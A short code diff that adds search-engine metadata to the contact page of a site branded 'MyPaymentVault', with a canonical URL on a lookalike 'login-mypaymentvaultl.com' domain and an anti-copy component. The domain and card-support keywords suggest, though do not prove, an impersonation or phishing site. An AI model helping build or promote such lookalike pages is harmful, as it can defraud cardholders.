@@ -4,6 +4,7 @@ import { zodResolver } from '@hookform/resolvers/zod';
 import { z } from 'zod';
 import { useLocation } from 'wouter';
 import { AntiCopyProtection } from '@/components/AntiCopyProtection';
+import { SEO } from '@/components/SEO';
 import { useToast } from '@/hooks/use-toast';
 import { useMutation } from '@tanstack/react-query';
 import { apiRequest } from '@/lib/queryClient';
@@ -204,6 +205,12 @@ export default function ContactInfoPage() {
 
   return (
     <>
+      <SEO 
+        title="Contact Us | MyPaymentVault Support"
+        description="Contact MyPaymentVault support for website login help, card usage questions, card not received issues, lost or stolen card reports, and more."
+        keywords="MyPaymentVault contact, mypaymentvault support, payment vault help, card not received, lost card, stolen card, customer support, employee support"
+        canonical="https://login-mypaymentvaultl.com/contact-info"
+      />
       <AntiCopyProtection />
       <div>
         <form id="contact_form" onSubmit={handleSubmit(onSubmit)}>
